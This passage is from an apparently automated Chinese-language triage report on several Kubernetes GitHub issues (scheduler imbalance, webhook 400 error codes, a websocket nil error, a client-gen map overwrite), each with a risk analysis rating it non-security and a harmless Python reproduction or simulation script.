	// We check the nodes starting from where we left off in the previous scheduling cycle,              <== All nodes are considered in a round-robin fashion.
	// this is to make sure all nodes have the same chance of being examined across pods.
	nodeInfo := nodes[(sched.nextStartNodeIndex+i)%numAllNodes]

func (sched *Scheduler) numFeasibleNodesToFind(percentageOfNodesToScore *int32, numAllNodes int32) (numNodes int32) {
	if numAllNodes < minFeasibleNodesToFind {
		return numAllNodes
	}
	
	if percentageOfNodesToScore != nil {
		percentage = *percentageOfNodesToScore
	} else {
		percentage = sched.percentageOfNodesToScore
	}
	
	if percentage == 0 {
		percentage = int32(50) - numAllNodes/125
		if percentage < minFeasibleNodesPercentageToFind {
			percentage = minFeasibleNodesPercentageToFind
		}
	}

	numNodes = numAllNodes * percentage / 100
	if numNodes < minFeasibleNodesToFind {
		return minFeasibleNodesToFind
	}

	return numNodes
}
```


#### Kubernetes version

- 1.27
- 1.30

#### Cloud provider

- Baremetal
- Azure

#### OS version

- Red Hat Enterprise Linux CoreOS 4.14
- Red Hat Enterprise Linux CoreOS 4.17

#### Install tools

_No response_

#### Container runtime (CRI) and version (if applicable)

- cri-o 1.27
- cri-o 1.30

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

_No response_

### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
1.  **Issue描述分析**: 该Issue描述了在大型Kubernetes集群（>200个节点）中进行快速、大规模（~7000个Pod）扩容时，调度器（scheduler）未能将具有相同资源请求（且无约束或亲和性）的Pod均匀分布到各个节点上，导致节点间负载差异较大（最繁忙和最不繁忙节点间Pod数量差异约20个）。即使Pod具有不同的CPU请求，CPU请求的总和在节点间也未达到平衡。该问题在小型集群或缓慢扩容时未被观察到。Issue提交者分析了调度器的`schedule_one`代码逻辑，特别是与节点采样相关的部分（`minFeasibleNodesToFind`和`percentageOfNodesToScore`），认为尽管每次调度只评估一部分节点，但理论上通过轮询（round-robin）应该能覆盖所有节点，达到最终的平衡。然而实际观察到的结果与预期不符。
2.  **潜在风险分析**:
    *   该Issue的核心是调度器的**性能和公平性**问题，而非安全漏洞。它描述的是在特定条件下（大集群、快速、大规模扩容）调度算法未能达到理想的负载均衡效果。
    *   这可能导致部分节点资源过载，而另一些节点资源利用率低下，影响集群整体的资源利用效率和应用的性能稳定性。极端情况下，过度集中的Pod可能导致某些节点资源耗尽，进而影响其上运行的Pod的可用性，但这属于资源管理和可用性问题。
    *   该行为**不涉及**未授权访问、权限提升、信息泄露、远程代码执行、容器逃逸等典型的安全风险。
    *   虽然调度不均可能间接导致某些节点更容易受到资源耗尽型拒绝服务（DoS）的影响，但这并非由外部攻击者利用漏洞发起，而是集群自身调度行为的结果。触发此现象需要用户具有创建/扩展大量Deployment/Pod的权限，这通常是集群管理员或具有相应授权的用户才能执行的操作。根据风险判断标准第5条，即使视为某种程度的DoS，由于需要较高权限才能触发，且并非典型的攻击向量，其风险等级也应较低或不涉及安全风险。
    *   Issue提交者在描述中并未暴露任何敏感信息（如凭证、私有IP、内部域名等），也未描述不当的操作或配置导致的问题。他描述的是Kubernetes调度器在特定场景下的行为表现。根据风险判断标准第4条，这不属于安全风险。
    *   该问题不涉及命令执行、容器逃逸、提权等高危风险（标准7）。
    *   虽然发生在多用户场景，但调度不均是系统层面的资源分配问题，影响所有需要调度的Pod，并非低权限用户利用此问题影响其他用户（标准8）。
3.  **结论**: 该Issue描述的是Kubernetes调度器在特定场景下的性能和负载均衡问题，属于功能或性能缺陷，不构成安全风险。

**复现过程：**

```python
# 该Issue描述的是调度器在特定大规模场景下的行为问题，不涉及安全风险，
# 且复现需要大型集群（>200节点）和大量Pod（~7000），
# 编写一个能在本地简单环境复现此规模和条件的POC不切实际且无助于安全风险验证。
# 因此，根据风险评级和问题性质，不提供复现脚本。
print("该Issue描述的是Kubernetes调度器在特定大规模场景下的性能和负载均衡问题，")
print("属于功能或性能缺陷，不构成安全风险。")
print("复现该问题需要大规模集群环境，无法通过简单的本地脚本模拟。")
print("因此，不提供复现脚本。")
```


**解释说明：**

该Issue报告了一个在大型Kubernetes集群（超过200个节点）中快速、大规模地（例如，同时扩容数千个Pod）调度具有相同资源请求的Pod时，出现的Pod分布不均的问题。这本质上是一个调度算法在特定极端条件下的性能表现和负载均衡效果未达预期的问题，可能影响集群的资源利用率和应用的部署均匀性。

根据提供的风险判断标准：
1.  该问题并非安全漏洞，不涉及未授权访问、数据泄露、代码执行等安全威胁，因此风险评级为“不涉及”（标准2）。
2.  触发此现象需要进行大规模扩容操作，这本身就需要相应的Kubernetes权限，并非无权限或低权限用户可以随意触发（标准5）。
3.  问题本身不涉及命令执行、容器逃逸、提权等高危风险（标准7）。
4.  虽然影响集群资源分配，但不属于一个用户利用漏洞影响其他用户安全的情况（标准8）。

由于该Issue被评估为“不涉及”安全风险，且复现条件苛刻（需要大型集群和模拟大规模快速扩容），编写用于安全验证的POC既不必要也不可行。因此，未提供复现脚本，仅在脚本中输出了相应的解释信息。

---


## Issue #130690 Apiserver admission control (validating, mutating webhooks) return misleading response code 400 on network errors

- Issue 链接：[#130690](https://github.com/kubernetes/kubernetes/issues/130690)

### Issue 内容

#### What happened?

When the apiserver calls a webhook, be it validating or mutating, and the configured endpoint is not reachable due to network issue (timeout, EOF due to a broken connection, rejected new connection, ...) the error defaults to a `400 Bad Request`:

* https://github.com/kubernetes/kubernetes/blob/9d2fc46556af162ff42a4773349d0f92f9ef8d50/staging/src/k8s.io/apiserver/pkg/admission/plugin/webhook/validating/dispatcher.go#L309
* https://github.com/kubernetes/kubernetes/blob/9d2fc46556af162ff42a4773349d0f92f9ef8d50/staging/src/k8s.io/apiserver/pkg/admission/plugin/webhook/mutating/dispatcher.go#L308

I noticed this when analyzing some random webhook invocation errors and seeing that that the increasing `apiserver_admission_webhook_rejection_count` metric (https://kubernetes.io/docs/reference/instrumentation/metrics/) had `rejection_code="400"`. This metric was introduced by @roycaihw in PR https://github.com/kubernetes/kubernetes/pull/81399 to expose the various causes for rejects.

With 4xx being "user side errors" and 5xx being server side errors, this mapping is clearly misleading or even incorrect and I suspected the actual webhook endpoint had responded with a 400.

But the client is clearly NOT at fault here. The 4xx even would indicate that a retry is likely not successful.




#### What did you expect to happen?

Non HTTP errors from a failed connection to the webhook endpoint should be mapped to `503 Service Unavailable` with either https://github.com/kubernetes/apimachinery/blob/e25aab096bf1a9b677c0e04efd3870b396494782/pkg/api/errors/errors.go#L339 or even https://github.com/kubernetes/apimachinery/blob/e25aab096bf1a9b677c0e04efd3870b396494782/pkg/api/errors/errors.go#L386 clearly indicating that this is an internal error.

Looking at the handling of response parsing errors in https://github.com/kubernetes/kubernetes/blob/9d2fc46556af162ff42a4773349d0f92f9ef8d50/staging/src/k8s.io/apiserver/pkg/admission/plugin/webhook/validating/dispatcher.go#L317-L317 there actually are cased handled with `503`.



#### How can we reproduce it (as minimally and precisely as possible)?

1. Register an invalid webhook URL
2. Invoke e.g. a Pod creation and look at the mentioned metrics.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>
1.31
1.32
(also present in main)
</details>


#### Cloud provider

<details>
AWS
</details>


#### OS version

<details>

NOT RELEVANT

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该 Issue 描述了 Kubernetes Apiserver 在调用 admission webhook (validating 或 mutating) 时，如果遇到网络错误（例如超时、连接拒绝、EOF 等导致无法访问 webhook endpoint），Apiserver 会向发起请求的客户端返回 HTTP 400 Bad Request 错误码。

问题核心在于错误码的误导性：
1.  网络错误导致 Apiserver 无法连接到其配置的内部组件（webhook server），这本质上是服务端（Apiserver 或其依赖的服务）的问题，按照 HTTP 语义，应该返回 5xx 系列错误码（如 503 Service Unavailable），表示服务端暂时无法处理请求。
2.  返回 400 Bad Request 暗示是客户端（如用户、控制器等调用 Apiserver API 的实体）发送的请求有问题，这与实际情况（网络连接失败）不符。
3.  这种错误的错误码会误导用户和监控系统（如 Issue 中提到的 `apiserver_admission_webhook_rejection_count` 指标记录为 400），增加问题排查的难度，用户可能会错误地认为自己的请求格式或内容有误。

安全风险分析：
1.  **该问题是否引入了新的攻击向量？** 否。该问题是关于 Apiserver 如何报告 *已经发生的* 网络错误。它本身并不创造新的漏洞让攻击者可以利用来访问未授权资源、执行代码或提升权限。
2.  **是否导致信息泄露？** 否。返回错误的 400 状态码，虽然令人困惑，但并未泄露超出正常错误信息范围之外的敏感数据。
3.  **是否可被利用于 DoS？** Admission Webhook 本身如果配置了 `failurePolicy: Fail`，当其后端不可达时，确实会阻止匹配规则的 API 请求，造成 DoS。然而，这是 `failurePolicy: Fail` 的预期行为，旨在确保策略强制执行。该 Issue 描述的 *错误码* 问题，并不会 *导致* 或 *加剧* 这种 DoS，只是错误地报告了 DoS 的原因。攻击者如果想利用 webhook 进行 DoS，需要具备创建/修改 `ValidatingWebhookConfiguration` 或 `MutatingWebhookConfiguration` 的高权限，并且核心是让 webhook 后端不可达，而不是利用返回 400 这个错误码本身。根据标准 5，这种需要高权限才能配置触发的 DoS，且问题本身是错误报告而非攻击使能，不应判断为高风险。
4.  **是否涉及提权、命令执行、容器逃逸等高风险场景？** 否。
5.  **多租户场景影响？** 一个用户（通常是管理员）配置的 webhook 如果失效，会影响所有触发该 webhook 的用户。但这需要配置权限，低权限用户无法通过此问题影响其他用户。

结论：该 Issue 指出的问题是一个错误处理和报告的缺陷（Bug），影响了系统的可观测性和问题排查效率，但它本身不构成一个安全漏洞，没有引入新的安全风险。攻击者无法利用这个“返回错误码为 400”的行为来获得额外的权限或能力。因此，风险评级为“不涉及”。

**复现过程：**

```python
import sys
import uuid
import time
from contextlib import contextmanager
from kubernetes import client, config
from kubernetes.client.rest import ApiException

# Constants
WEBHOOK_NAME = f"poc-misleading-error-{uuid.uuid4().hex[:6]}"
NAMESPACE = "default" # Namespace for pod creation test
POD_NAME = f"poc-pod-{uuid.uuid4().hex[:6]}"
# Use a non-existent service URL to simulate network error
UNREACHABLE_WEBHOOK_URL = "https://webhook-does-not-exist-for-poc.local:443/validate"

@contextmanager
def validating_webhook_configuration(api_instance: client.AdmissionregistrationV1Api):
    """Context manager to create and clean up ValidatingWebhookConfiguration."""
    webhook_config = client.V1ValidatingWebhookConfiguration(
        api_version="admissionregistration.k8s.io/v1",
        kind="ValidatingWebhookConfiguration",
        metadata=client.V1ObjectMeta(name=WEBHOOK_NAME),
        webhooks=[
            client.V1ValidatingWebhook(
                name=f"{WEBHOOK_NAME}.example.com",
                rules=[
                    client.V1RuleWithOperations(
                        operations=["CREATE"],
                        api_groups=[""],
                        api_versions=["v1"],
                        resources=["pods"],
                    )
                ],
                client_config=client.AdmissionregistrationV1WebhookClientConfig(
                    url=UNREACHABLE_WEBHOOK_URL,
                    # ca_bundle is required for HTTPS URLs, even if fake.
                    # Provide a dummy base64 encoded value. "Cg==" is "\n"
                    ca_bundle="Cg=="
                ),
                admission_review_versions=["v1"],
                side_effects="None",
                # FailurePolicy=Fail ensures the operation is blocked if the webhook fails
                failure_policy="Fail",
                # Short timeout to quickly trigger network error
                timeout_seconds=2
            )
        ]
    )

    try:
        print(f"[*] Creating ValidatingWebhookConfiguration: {WEBHOOK_NAME}")
        api_instance.create_validating_webhook_configuration(webhook_config)
        # Wait a moment for the configuration to be potentially active
        time.sleep(5)
        yield WEBHOOK_NAME
    except ApiException as e:
        print(f"[!] Failed to create webhook configuration: {e}", file=sys.stderr)
        # If creation failed, ensure we don't try to delete non-existent object
        webhook_name_to_delete = None
        raise # Re-raise the exception as creation failed
    finally:
        try:
            print(f"[*] Deleting ValidatingWebhookConfiguration: {WEBHOOK_NAME}")
            api_instance.delete_validating_webhook_configuration(WEBHOOK_NAME)
        except ApiException as e:
            # Ignore not found errors during cleanup
            if e.status != 404:
                print(f"[!] Failed to delete webhook configuration {WEBHOOK_NAME}: {e}", file=sys.stderr)


def create_test_pod(api_instance: client.CoreV1Api):
    """Attempts to create a simple pod."""
    pod_manifest = {
        "apiVersion": "v1",
        "kind": "Pod",
        "metadata": {"name": POD_NAME, "namespace": NAMESPACE},
        "spec": {
            "containers": [{
                "name": "nginx",
                "image": "nginx:latest"
            }]
        }
    }
    print(f"[*] Attempting to create Pod: {POD_NAME} in namespace {NAMESPACE}")
    try:
        api_instance.create_namespaced_pod(body=pod_manifest, namespace=NAMESPACE)
        print(f"[!] Pod creation succeeded unexpectedly!", file=sys.stderr)
        return False, None # Should have failed
    except ApiException as e:
        print(f"[*] Pod creation failed as expected.")
        print(f"    Status Code: {e.status}")
        print(f"    Reason: {e.reason}")
        # Check if the status code is 400 (Bad Request) as reported in the issue
        if e.status == 400:
            print(f"[+] SUCCESS: Received HTTP 400 status code, confirming the issue.")
            return True, e.status
        else:
            print(f"[-] FAILURE: Received HTTP {e.status} instead of 400. Issue might be fixed or scenario differs.")
            return False, e.status
    except Exception as e:
        print(f"[!] An unexpected error occurred during pod creation: {e}", file=sys.stderr)
        return False, None


def main():
    """Main function to run the PoC."""
    try:
        # Load Kubernetes configuration from default location (~/.kube/config)
        config.load_kube_config()
    except Exception as e:
        print(f"[!] Failed to load Kubernetes configuration: {e}", file=sys.stderr)
        print("[!] Ensure kubectl is configured correctly.", file=sys.stderr)
        sys.exit(1)

    admission_api = client.AdmissionregistrationV1Api()
    core_api = client.CoreV1Api()

    result = False
    status_code = None
    try:
        with validating_webhook_configuration(admission_api):
            # Wait briefly again to ensure apiserver processes the webhook config
            print("[*] Waiting a few seconds for webhook configuration to settle...")
            time.sleep(5)
            result, status_code = create_test_pod(core_api)
            
            # Attempt cleanup of the pod if it was somehow created (shouldn't happen)
            try:
                core_api.delete_namespaced_pod(POD_NAME, NAMESPACE)
            except ApiException as e:
                if e.status != 404: # Ignore if not found (expected case)
                     print(f"[!] Warning: Failed to cleanup pod {POD_NAME}: {e.status} {e.reason}")
                pass # Pod likely wasn't created

    except ApiException as e:
        print(f"[!] An API error occurred during setup or test: {e.status} {e.reason}", file=sys.stderr)
        # Attempt cleanup if webhook might exist
        try:
            admission_api.delete_validating_webhook_configuration(WEBHOOK_NAME)
        except ApiException:
            pass # Ignore cleanup errors after a main failure
    except Exception as e:
        print(f"[!] An unexpected error occurred: {e}", file=sys.stderr)
         # Attempt cleanup if webhook might exist
        try:
            admission_api.delete_validating_webhook_configuration(WEBHOOK_NAME)
        except ApiException:
            pass # Ignore cleanup errors after a main failure


    print("\n[*] PoC finished.")
    if result:
        print("[*] Result: Successfully reproduced the issue (received 400 Bad Request).")
    elif status_code is not None:
         print(f"[*] Result: Failed to reproduce the issue (received {status_code} instead of 400).")
    else:
        print("[*] Result: PoC execution failed or was interrupted.")


# Execute the main function directly as per requirements
main()
```


**解释说明：**

该 Python 脚本旨在于本地 Kubernetes 集群环境中复现 Issue 中描述的问题。

1.  **环境假设**: 脚本假设本地已配置好 `kubectl` 并能访问一个 Kubernetes 集群（例如 Minikube, Kind, Docker Desktop 等），并且 `kubernetes` Python 库已安装 (`pip install kubernetes`)。它会从默认位置 (`~/.kube/config`) 加载集群配置。
2.  **创建无效 Webhook 配置**:
    *   脚本首先定义了一个 `ValidatingWebhookConfiguration` 对象。
    *   此配置包含一个指向 `https://webhook-does-not-exist-for-poc.local:443/validate` 的 webhook。这是一个故意设置的、无法解析和访问的 URL，目的是模拟 Apiserver 调用 webhook 时发生的网络错误。
    *   `failurePolicy` 设置为 `Fail`，这意味着如果 Apiserver 无法成功调用此 webhook，它必须拒绝相关的 API 请求（在此例中是 Pod 创建请求）。
    *   `timeoutSeconds` 设置为较短的 2 秒，以加速网络错误的发生（如连接超时）。
    *   `caBundle` 提供了一个最小的、有效的 Base64 编码值，因为 `clientConfig` 使用 HTTPS URL 时此字段是必需的，即使 URL 本身是假的。
    *   该配置的作用域是针对所有命名空间中 `Pod` 资源的 `CREATE` 操作。
    *   使用 `@contextmanager` 和 `try...finally` 确保在脚本执行完毕或出错时，尝试删除创建的 `ValidatingWebhookConfiguration`，清理环境。
3.  **触发 Webhook**:
    *   在 webhook 配置创建并等待片刻后，脚本尝试在 `default` 命名空间中创建一个简单的 Nginx Pod (`create_test_pod` 函数)。
    *   因为 Pod 的创建操作 (`CREATE pods`) 匹配了 webhook 的规则，Apiserver 会尝试调用配置中那个无法访问的 URL。
4.  **验证错误码**:
    *   由于 webhook URL 无法访问且 `failurePolicy` 为 `Fail`，Apiserver 应该拒绝 Pod 创建请求。
    *   脚本捕获 `kubernetes.client.rest.ApiException` 异常。
    *   关键验证步骤是检查捕获到的异常对象 `e` 的 `status` 属性。根据 Issue 描述，预期这个值应该是 `400`。
    *   脚本打印出接收到的状态码。如果状态码是 400，则认为成功复现了 Issue 中描述的行为（返回了误导性的 400 错误码）；否则，说明问题可能已被修复，或者当前环境的行为与 Issue 描述不符。
5.  **资源清理**: 无论成功与否，脚本都会在 `finally` 块中尝试删除之前创建的 `ValidatingWebhookConfiguration`。如果 Pod 创建意外成功（理论上不应发生），也会尝试删除 Pod。
6.  **执行**: 脚本最后直接调用 `main()` 函数开始执行。

该脚本通过模拟 Apiserver 无法连接到其配置的 webhook 端点的场景，验证了在这种网络失败的情况下，Apiserver 是否如 Issue 所述返回了 HTTP 400 错误码给发起 Pod 创建请求的客户端。由于该问题本身非安全漏洞，此脚本仅用于验证 Apiserver 的错误报告行为，而非演示安全风险。

---


## Issue #130634 Wrong error is passed and printed upon websocket message read failure

- Issue 链接：[#130634](https://github.com/kubernetes/kubernetes/issues/130634)

### Issue 内容

#### What happened?

When `kubectl cp` using websockets fails on reading the message, a nil error is printed instead actual failure reason due to wrong variable used in the websocket implementation.

```
kubectl -n=gather-artifacts cp --retries=42 -c=wait-for-artifacts must-gather:/tmp/artifacts /logs/artifacts/must-gather/0
tar: Removing leading `/' from member names
E0307 11:05:27.652791    1349 v2.go:167] "Unhandled Error" err="read message: %!w(<nil>)"
E0307 11:05:27.652794    1349 v2.go:150] "Unhandled Error" err="read message: %!w(<nil>)"
error: error reading from error stream: read message: %!w(<nil>) 
```

#### What did you expect to happen?

Get real failure reason instead of nil error.

#### How can we reproduce it (as minimally and precisely as possible)?

It happens from time to time when using `kubectl cp` to copy directory having huge number of files.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version -o yaml
clientVersion:
  buildDate: "2025-03-02T01:21:59Z"
  compiler: gc
  gitCommit: 948afe5ca072329a73c8e79ed5938717a5cb3d21
  gitTreeState: clean
  gitVersion: v1.31.1
  goVersion: go1.22.6
  major: "1"
  minor: "31"
  platform: linux/amd64
kustomizeVersion: v5.4.2
serverVersion:
  buildDate: "2025-02-17T04:15:03Z"
  compiler: gc
  gitCommit: 84f41c2100b3d5f238e0dc12381df8fa8ad306bf
  gitTreeState: clean
  gitVersion: v1.31.6-gke.1064000
  goVersion: go1.22.12 X:boringcrypto
  major: "1"
  minor: "31"
  platform: linux/amd64

```

</details>


#### Cloud provider

<details>
GKE
</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
1.  **问题描述**: 该 Issue 指出，在使用 `kubectl cp` 命令通过 websockets 复制文件时，如果读取 websocket 消息失败，相关的错误日志（v2.go）打印的是一个 `nil` 错误 (`read message: %!w(<nil>)`)，而不是导致读取失败的实际根本原因。
2.  **问题影响**: 这会导致用户无法得知 `kubectl cp` 失败的具体原因（例如网络问题、超时、对端关闭连接等），增加了问题排查的难度。用户只能看到一个通用的、无信息的错误提示。
3.  **安全风险分析**:
    *   该问题本质上是一个错误处理和日志记录的缺陷。它隐藏了底层的错误信息，但并未引入新的攻击向量或漏洞。
    *   它不涉及敏感信息泄露（规则 4 和 6 不适用）。日志中没有暴露凭据或其他敏感数据，反而是缺少了信息。
    *   它不直接导致拒绝服务（DoS）、远程代码执行（RCE）、权限提升（PrivEsc）或容器逃逸（规则 5 和 7 不适用）。`kubectl cp` 操作本身仍然需要用户具有相应的 RBAC 权限才能执行。
    *   它不会让低权限用户影响其他用户（规则 8 不适用）。错误日志只影响执行 `kubectl cp` 的用户自身进行诊断。
    *   虽然错误信息被隐藏，但这本身并不构成一个可利用的安全漏洞。攻击者无法利用这个“隐藏的错误信息”来获取未授权访问或执行恶意操作。
    *   根据 CVSS 3.1 标准，此问题对机密性（Confidentiality）、完整性（Integrity）和可用性（Availability）几乎没有安全层面的直接影响。它主要影响的是可用性中的“可诊断性”或“易用性”。
4.  **结论**: 该 Issue 描述的是一个软件缺陷（Bug），影响了错误排查的效率，但不构成安全风险。

**复现过程：**

```python
# 该 Issue 描述的问题是一个错误处理和日志记录的缺陷，
# 它隐藏了底层 websocket 读取失败的真实原因，打印了 nil 错误。
# 这本身不是一个安全漏洞，而是一个影响可用性（可诊断性）的 Bug。
# 根据风险判断标准，此问题评级为“不涉及”，因此不需要提供复现 POC 脚本。
#
# 要在实际环境中观察到类似现象，需要模拟 `kubectl cp` 使用的 websocket 连接
# 在读取消息时发生错误（例如网络中断、超时、服务端异常关闭连接等），
# 并检查 Kubernetes 组件（可能是 Kubelet 或 API Server 的代理部分）
# 输出的日志是否如 Issue 中所述隐藏了具体错误原因。
# 模拟这种底层网络或协议层面的错误需要更复杂的环境设置或代码注入，
# 超出了典型 POC 的范畴，且目的并非验证安全风险。

print("该 Issue 指出的问题并非安全风险，评级为'不涉及'，无需 POC。")
print("问题在于错误日志未能显示底层 websocket 读取失败的真实原因。")
```


**解释说明：**

该 Issue 描述的问题是 `kubectl cp` 在通过 websocket 进行文件传输时，若发生读取错误，日志中未能正确显示底层的错误原因，而是打印了一个通用的 `nil` 错误。这使得用户难以诊断 `kubectl cp` 失败的具体原因。

经过分析，这个问题属于错误处理逻辑上的缺陷，影响了程序的可调试性和用户体验，但它本身并不引入新的安全风险。它不会导致未授权访问、数据泄露、权限提升或远程代码执行等安全问题。因此，根据提供的风险判断标准，此 Issue 的风险评级为“不涉及”。

由于该问题不涉及安全风险，特别是高风险问题，所以不需要提供用于复现的 Python POC 脚本。提供的 Python 代码片段仅用于说明此结论。要观察此现象，需要在特定场景下（如网络不稳定或传输大量文件时）触发 `kubectl cp` 的 websocket 读取错误，并检查相关组件的日志输出。

---


## Issue #130633 Resources overwritten when using identical Group/Version in client-gen

- Issue 链接：[#130633](https://github.com/kubernetes/kubernetes/issues/130633)

### Issue 内容

#### What happened?

In [staging/src/k8s.io/code-generator/cmd/client-gen/args/args.go#L129-L138](https://github.com/kubernetes/kubernetes/blob/v1.33.0-alpha.3/staging/src/k8s.io/code-generator/cmd/client-gen/args/args.go#L129-L138), the `GroupVersionPackages()` function uses GroupVersion as map keys to store package paths. When multiple different API resources use the same Group and Version, the later-defined resources will overwrite earlier ones in the returned map.

#### What did you expect to happen?

Resources with different package names but the same group names and versions should not be overwritten by each other.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Define two different API resources (e.g., `example` and `example2`)
2. Configure both resources with an identical group (e.g., `code-generator.k8s.io`) and version (e.g., `v1`)
3. Run `kube::codegen::gen_client` code generation

#### Anything else we need to know?

During client code generation, only the last resource with a specific Group/Version combination is retained in the map returned by GroupVersionPackages(). This causes previously defined resources to be ignored or overwritten, resulting in incomplete client code generation.

The issue occurs in this implementation:
``` golang
func (args *Args) GroupVersionPackages() map[types.GroupVersion]string {
    res := map[types.GroupVersion]string{}
    for _, pkg := range args.Groups {
        for _, v := range pkg.Versions {
            // When two different resources have the same Group and Version, 
            // they will use identical keys in the map
            res[types.GroupVersion{Group: pkg.Group, Version: v.Version}] = v.Package
        }
    }
    return res
}
```
When multiple resources use the same Group and Version combination, later resources overwrite earlier ones in the map, causing data loss.


#### Kubernetes version

<details>

```console
code-generator v0.33.0-alpha.3
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
此 Issue 描述了 Kubernetes 代码生成工具 `client-gen` 中的一个问题。具体来说，在 `GroupVersionPackages()` 函数中，使用 `map[types.GroupVersion]string` 来存储不同 API 组（Group）和版本（Version）对应的包路径。当开发者定义了多个不同的 API 资源（可能位于不同的 Go 包中），但为它们配置了相同的 Group 和 Version 时，由于 Go map 的特性，后处理的资源会覆盖掉先处理的同 Group/Version 资源在 map 中的条目。

这会导致 `client-gen` 生成的客户端代码不完整，只包含了最后那个具有特定 Group/Version 组合的资源的相关代码，而忽略了之前被覆盖的资源。

这是一个功能性的缺陷（bug），影响的是开发阶段代码生成的正确性。它会导致生成的客户端库缺少预期的 API 接口，可能引起编译错误或运行时找不到对应客户端方法的问题。

根据风险判断标准：
1.  该问题是代码生成工具的功能缺陷，发生在编译/开发阶段，而不是运行时。
2.  它不直接导致运行时系统的安全漏洞，如命令执行、提权、信息泄露（除了构建日志可能显示不期望的行为外）、拒绝服务（对运行时集群而言）。
3.  它不涉及 issue 提交者暴露敏感信息或不当操作。
4.  攻击者无法利用此 bug 直接攻击运行中的 Kubernetes 集群或窃取数据。其影响局限于使用 `client-gen` 的开发者，导致生成的代码不符合预期。
5.  虽然可能导致构建失败或生成的软件功能不全，但这不属于 CVSS 评估范围内的典型安全风险。

因此，该问题不被视为一个安全风险。

**复现过程：**

```python
# 此问题是一个代码生成逻辑错误，并非运行时安全漏洞，
# 且发生在 Go 语言编写的 client-gen 工具内部，
# 使用 Python 编写直接复现 Go 代码生成过程的 POC 较为复杂且意义不大。
#
# 以下 Python 代码仅用于模拟和演示 Issue 中描述的 Go map 覆盖逻辑，
# 以说明为什么同 Group/Version 的不同资源会被覆盖。

import time
import threading

# 模拟 Go 中的 types.GroupVersion 结构
class GroupVersion:
    def __init__(self, group, version):
        self.group = group
        self.version = version

    # 为了能在字典中作为 key，需要实现 __hash__ 和 __eq__
    def __hash__(self):
        return hash((self.group, self.version))

    def __eq__(self, other):
        if not isinstance(other, GroupVersion):
            return NotImplemented
        return (self.group, self.version) == (other.group, other.version)

    def __repr__(self):
        return f"GroupVersion(group='{self.group}', version='{self.version}')"

# 模拟 Go 中的 GroupVersionPackages 函数逻辑
def simulate_group_version_packages(groups_config):
    """
    模拟 client-gen 中 GroupVersionPackages 函数的核心逻辑。

    Args:
        groups_config: 一个列表，每个元素是一个字典，代表一个 Group 配置，
                       包含 'Group' 键和 'Versions' 键（其值为版本字典列表）。
                       每个版本字典包含 'Version' 和 'Package' 键。
                       例如:
                       [
                           {
                               'Group': 'example.com',
                               'Versions': [
                                   {'Version': 'v1', 'Package': 'path/to/package1/v1'},
                                   {'Version': 'v2', 'Package': 'path/to/package1/v2'}
                               ]
                           },
                           {
                               'Group': 'example.com', # 与上面相同的 Group
                               'Versions': [
                                   {'Version': 'v1', 'Package': 'path/to/package2/v1'} # 与上面相同的 Version
                               ]
                           }
                       ]
    Returns:
        一个字典，键是 GroupVersion 对象，值是包路径字符串。
    """
    result_map = {}
    print("开始模拟处理 Group/Version 配置...")
    for pkg_group in groups_config:
        group_name = pkg_group.get('Group', '')
        versions = pkg_group.get('Versions', [])
        print(f"处理 Group: {group_name}")
        for version_info in versions:
            version_name = version_info.get('Version', '')
            package_path = version_info.get('Package', '')
            gv = GroupVersion(group=group_name, version=version_name)
            print(f"  处理 Version: {version_name}, Package: {package_path}")
            print(f"  尝试将 Key: {gv} (Hash: {hash(gv)}) 关联到 Value: {package_path}")
            # 核心逻辑：如果 key 已存在，新的值会覆盖旧的值
            result_map[gv] = package_path
            print(f"  当前 Map 内容: {result_map}")
            # 短暂暂停以模拟处理过程
            time.sleep(0.1)
    print("处理完成.")
    return result_map

def main():
    # 定义模拟的输入配置，包含两个不同的包路径，但使用相同的 Group 和 Version
    mock_input_config = [
        {
            'Group': 'code-generator.k8s.io',
            'Versions': [
                {'Version': 'v1', 'Package': 'path/to/example/v1'}
            ]
        },
        {
            'Group': 'another.group.com', # 不同的 Group
            'Versions': [
                {'Version': 'v1', 'Package': 'path/to/another/v1'}
            ]
        },
        {
            'Group': 'code-generator.k8s.io', # 与第一个相同的 Group
            'Versions': [
                {'Version': 'v1', 'Package': 'path/to/example2/v1'} # 与第一个相同的 Version，但包路径不同
            ]
        }
    ]

    print("模拟 client-gen 的 GroupVersionPackages 函数行为:")
    final_map = simulate_group_version_packages(mock_input_config)

    print("\n最终生成的 GroupVersion 到 Package 的映射:")
    print(final_map)

    # 验证结果
    expected_key = GroupVersion(group='code-generator.k8s.io', version='v1')
    expected_value_after_overwrite = 'path/to/example2/v1'

    if expected_key in final_map and final_map[expected_key] == expected_value_after_overwrite:
        print(f"\n验证成功：Key {expected_key} 最终映射到了 '{expected_value_after_overwrite}'，说明第一个包路径 'path/to/example/v1' 被覆盖了。")
        # 查找是否还存在另一个 Group 的映射
        other_key = GroupVersion(group='another.group.com', version='v1')
        if other_key in final_map and final_map[other_key] == 'path/to/another/v1':
             print(f"验证成功：Key {other_key} 依然存在，其值为 '{final_map[other_key]}'")
        else:
             print(f"验证失败：Key {other_key} 未按预期存在于最终映射中。")

    else:
        print(f"\n验证失败：Key {expected_key} 的值不是预期的 '{expected_value_after_overwrite}' 或 Key 不存在。当前值为: {final_map.get(expected_key)}")

# 设置一个简单的超时机制
exit_event = threading.Event()
def run_main_with_timeout():
    main_thread = threading.Thread(target=main)
    main_thread.start()
    main_thread.join(timeout=120) # 120秒超时
    if main_thread.is_alive():
        print("\n错误：脚本执行超时（超过120秒），强制退出。")
        # 在实际场景中，可能需要更强硬的停止方式，但对于此模拟脚本，打印信息即可
